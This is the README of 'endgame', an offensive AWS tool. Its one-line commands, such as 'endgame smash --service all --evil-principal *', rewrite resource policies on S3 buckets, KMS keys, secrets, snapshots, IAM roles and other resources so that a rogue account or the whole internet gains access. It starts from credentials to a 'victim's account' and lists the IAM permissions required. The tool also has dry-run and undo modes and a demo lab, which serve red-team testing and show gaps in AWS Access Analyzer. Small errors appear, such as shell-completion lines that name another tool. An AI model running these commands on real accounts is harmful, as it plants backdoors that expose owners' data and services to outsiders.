# endgame

Use a one-liner command to backdoor an AWS account's resources with a rogue AWS Account - or to the entire internet 😈

[![continuous-integration](https://github.com/salesforce/endgame/workflows/continuous-integration/badge.svg?)](https://github.com/salesforce/endgame/actions?query=workflow%3Acontinuous-integration)
[![Documentation Status](https://readthedocs.org/projects/endgame/badge/?version=latest)](https://endgame.readthedocs.io/en/latest/?badge=latest)
[![Join the chat at https://gitter.im/salesforce/policy_sentry](https://badges.gitter.im/salesforce/endgame.svg)](https://gitter.im/salesforce/endgame?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Twitter](https://img.shields.io/twitter/url/https/twitter.com/kmcquade3.svg?style=social&label=Follow%20the%20author)](https://twitter.com/kmcquade3)

[//]: [![Downloads](https://pepy.tech/badge/endgame)](https://pepy.tech/project/endgame)

![](./docs/images/endgame.gif)

**TLDR**: `endgame smash --service all` to create backdoors across your entire AWS account - either to a rogue IAM user/role or to the entire internet.

```bash
# this will ruin your day
endgame smash --service all --evil-principal "*" --dry-run
# This will show you how your day could have been ruined
endgame smash --service all --evil-principal "*" --dry-run
# Atone for your sins
endgame smash --service all --evil-principal "*" --undo
# Consider maybe atoning for your sins
endgame smash --service all --evil-principal "*" --undo --dry-run

# List resources available for exploitation
endgame list-resources --service all
# Expose specific resources
endgame expose --service s3 --name computers-were-a-mistake
```

## Supported Backdoors

`endgame` can create backdoors for resources in any of the services listed below. While AWS Access Analyzer is meant to detect exposed resources of these types, it currently only supports 7/17 of the services that `endgame` attacks.

| Backdoor Resource Type        | Support | [AWS Access Analyzer Support][1] |
|-------------------------------|---------|-------------------------         |
| ACM PCA                       | ✅     | ❌                               |
| CloudWatch Resource Policies  | ✅     | ❌                               |
| EBS Snapshots                 | ✅     | ❌                               |
| ECR Repositories              | ✅     | ❌                               |
| EFS File Systems              | ✅     | ❌                               |
| ElasticSearch Domains         | ✅     | ❌                               |
| Glacier Vault Access Policies | ✅     | ❌                               |
| IAM Roles                     | ✅     | ✅                               |
| KMS Keys                      | ✅     | ✅                               |
| Lambda Functions              | ✅     | ✅                               |
| Lambda Layers                 | ✅     | ✅                               |
| RDS Snapshots                 | ✅     | ❌                               |
| S3 Buckets                    | ✅     | ✅                               |
| Secrets Manager Secrets       | ✅     | ✅                               |
| SES Identity Policies         | ✅     | ❌                               |
| SQS Queues                    | ✅     | ✅                               |
| SNS Topics                    | ✅     | ❌                               |

## Tutorial

### Installation

* pip3

```bash
pip3 install --user endgame
```

* Homebrew (this will not work until the repository is public)

```bash
brew tap salesforce/endgame https://github.com/salesforce/endgame
brew install endgame
```

Now you should be able to execute `endgame` from command line by running `endgame --help`.

#### Shell Completion

* To enable Bash completion, put this in your `~/.bashrc`:

```bash
eval "$(_CLOUDSPLAINING_COMPLETE=source cloudsplaining)"
```

* To enable ZSH completion, put this in your `~/.zshrc`:

```bash
eval "$(_CLOUDSPLAINING_COMPLETE=source_zsh cloudsplaining)"
```

### Setup

* First, authenticate to AWS CLI using credentials to the victim's account.

* Set the environment variables for `EVIL_PRINCIPAL` (required). Optionally, set the environment variables for `AWS_REGION` and `AWS_PROFILE`

```bash
# Set `EVIL_PRINCIPAL` environment variable to the rogue IAM User or 
# Role that you want to give access to.
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

# If you don't supply these values, these will be the defaults.
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

### Demo Infrastructure

* Create the Terraform demo infrastructure

This program makes modifications to live AWS Infrastructure, which can vary from account to account. We have bootstrapped some of this for you.

> 🚨This will create real AWS infrastructure and will cost you money! 🚨

```bash
```bash
# To create the demo infrastructure
make terraform-demo
```

> _Note: It is not exposed to rogue IAM users or to the internet at first. That will only happen after you run the exposure commands._

### List Victim Resources

You can use the `list-resources` command to list resources in the account that you can backdoor.

* Examples:

```bash
# List IAM Roles, so you can create a backdoor via their AssumeRole policies
endgame list-resources -s iam

# List S3 buckets, so you can create a backdoor via their Bucket policies 
endgame list-resources --service s3

# List all resources across services that can be backdoored
endgame list-resources --service all
```

### Backdoor specific resources

* Use the `--dry-run` command first to test it without modifying anything:

```bash
endgame expose --service iam --name test-resource-exposure --dry-run
```

* To create the backdoor to that resource from your rogue account

> 🚨this is not a drill🚨

```bash
endgame expose --service iam --name test-resource-exposure
```

Example output:

> ![Expose for real](docs/images/add-myself-foreal.png)

* If you want to atone for your sins (optional) you can use the `--undo` flag to roll back the changes.

```bash
endgame expose --service iam --name test-resource-exposure --undo
```

> ![Expose undo](docs/images/add-myself-undo.png)

### Expose everything

```bash
endgame smash --service all --dry-run
endgame smash --service all
endgame smash --service all --undo
```

### Destroy Demo Infrastructure

* Now that you are done with the tutorial, don't forget to clean up the demo infrastructure.

```bash
# Destroy the demo infrastructure
make terraform-destroy
```

## Current Resource Support Statuses

### Backdoors via Resource-based Policies

| Backdoor Resource Type        | Support | [AWS Access Analyzer Support][1] |
|-------------------------------|---------|-------------------------         |
| ACM PCA                       | ✅     | ❌                               |
| CloudWatch Resource Policies  | ✅     | ❌                               |
| ECR Repositories              | ✅     | ❌                               |
| EFS File Systems              | ✅     | ❌                               |
| ElasticSearch Domains         | ✅     | ❌                               |
| Glacier Vault Access Policies | ✅     | ❌                               |
| IAM Roles                     | ✅     | ✅                               |
| KMS Keys                      | ✅     | ✅                               |
| Lambda Functions              | ✅     | ✅                               |
| Lambda Layers                 | ✅     | ✅                               |
| S3 Buckets                    | ✅     | ✅                               |
| Secrets Manager Secrets       | ✅     | ✅                               |
| SES Identity Policies         | ✅     | ❌                               |
| SQS Queues                    | ✅     | ✅                               |
| SNS Topics                    | ✅     | ❌                               |

### Backdoors via Sharing APIs

| Backdoored Resource Type      | Support Status |
|-------------------------------|----------------|
| EC2 AMIs                      | ❌             |
| EBS Snapshots                 | ✅             |
| RDS Snapshots                 | ✅             |
| RDS DB Cluster Snapshots      | ❌             |

## IAM Permissions

The following IAM Permissions are used to create these backdoors:

```json
{
    "Version": "2012-10-17",
    "Statement": [
            {
            "Sid": "IAmInevitable",
            "Effect": "Allow",
            "Action": [
                "acm-pca:DeletePolicy",
                "acm-pca:GetPolicy",
                "acm-pca:ListCertificateAuthorities",
                "acm-pca:PutPolicy",
                "ec2:DescribeSnapshotAttribute",
                "ec2:DescribeSnapshots",
                "ec2:ModifySnapshotAttribute",
                "ecr:DescribeRepositories",
                "ecr:DeleteRepositoryPolicy",
                "ecr:GetRepositoryPolicy",
                "ecr:SetRepositoryPolicy",
                "elasticfilesystem:DescribeFileSystems",
                "elasticfilesystem:DescribeFileSystemPolicy",
                "elasticfilesystem:PutFileSystemPolicy",
                "es:DescribeElasticsearchDomainConfig",
                "es:ListDomainNames",
                "es:UpdateElasticsearchDomainConfig",
                "glacier:GetVaultAccessPolicy",
                "glacier:ListVaults",
                "glacier:SetVaultAccessPolicy",
                "iam:GetRole",
                "iam:ListRoles",
                "iam:UpdateAssumeRolePolicy",
                "kms:GetKeyPolicy",
                "kms:ListKeys",
                "kms:ListAliases",
                "kms:PutKeyPolicy",
                "lambda:AddLayerVersionPermission",
                "lambda:AddPermission",
                "lambda:GetPolicy",
                "lambda:GetLayerVersionPolicy",
                "lambda:ListFunctions",
                "lambda:ListLayers",
                "lambda:ListLayerVersions",
                "lambda:RemoveLayerVersionPermission",
                "lambda:RemovePermission",
                "logs:DescribeResourcePolicies",
                "logs:DeleteResourcePolicy",
                "logs:PutResourcePolicy",
                "rds:DescribeDbClusterSnapshots",
                "rds:DescribeDbClusterSnapshotAttributes",
                "rds:DescribeDbSnapshots",
                "rds:DescribeDbSnapshotAttributes",
                "rds:ModifyDbSnapshotAttribute",
                "rds:ModifyDbClusterSnapshotAttribute",
                "s3:ListAllMyBuckets",
                "s3:GetBucketPolicy",
                "s3:PutBucketPolicy",
                "secretsmanager:GetResourcePolicy",
                "secretsmanager:DeleteResourcePolicy",
                "secretsmanager:ListSecrets",
                "secretsmanager:PutResourcePolicy",
                "ses:DeleteIdentityPolicy",
                "ses:GetIdentityPolicies",
                "ses:ListIdentities",
                "ses:ListIdentityPolicies",
                "ses:PutIdentityPolicy",
                "sns:AddPermission",
                "sns:ListTopics",
                "sns:GetTopicAttributes",
                "sns:RemovePermission",
                "sqs:AddPermission",
                "sqs:GetQueueUrl",
                "sqs:GetQueueAttributes",
                "sqs:ListQueues",
                "sqs:RemovePermission"
            ],
            "Resource": "*"
        }
    ]
}
```

You don't need **all** of these permissions to run the tool. You just need enough from each service. So, `s3:ListAllMyBuckets`, `s3:GetBucketPolicy`, and `s3:PutBucketPolicy` are all the permissions needed to leverage this tool to expose S3 buckets.

## Contributing

## Testing

### Unit tests

* Run [pytest](https://docs.pytest.org/en/stable/) with the following:

```bash
make test
```

### Security tests

* Run [bandit](https://bandit.readthedocs.io/en/latest/) with the following:

```bash
make security-test
```

### Integration tests

After making any modifications to the program, you can run a full-fledged integration test, using this program against your own test infrastructure in AWS.

* First, set your environment variables

```bash
# Set the environment variable for the username that you will create a backdoor for.
export EVIL_PRINCIPAL="arn:aws:iam::999988887777:user/evil"
export AWS_REGION="us-east-1"
export AWS_PROFILE="default"
```

* Then run the full-fledged integration test:

```bash
make integration-test
```

This does the following:
* Sets up your local dev environment (see `setup-dev`) in the `Makefile`
* Creates the Terraform infrastructure (see `terraform-demo` in the `Makefile`)
* Runs `list-resources`, `exploit --dry-run`, and `expose` against this live infrastructure
* Destroys the Terraform infrastructure (see `terraform-destroy` in the `Makefile`)

Note that the `expose` command will not expose the resources to the world - it will only expose them to your rogue user, not to the world.

# References

* [AWS Exposable Resources](https://github.com/SummitRoute/aws_exposable_resources)

* [Moto: A library that allows you to easily mock out tests based on AWS Infrastructure](http://docs.getmoto.org/en/latest/docs/moto_apis.html)

* [Moto Unit tests - a  great way to get examples of how they mock the creation of AWS resources](https://github.com/spulec/moto/blob/master/tests)

* [Paginators](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/paginators.html)

* [Exception handling for specific AWS Services](https://boto3.amazonaws.com/v1/documentation/api/latest/guide/error-handling.html#parsing-error-responses-and-catching-exceptions-from-aws-services)

[1]: https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html
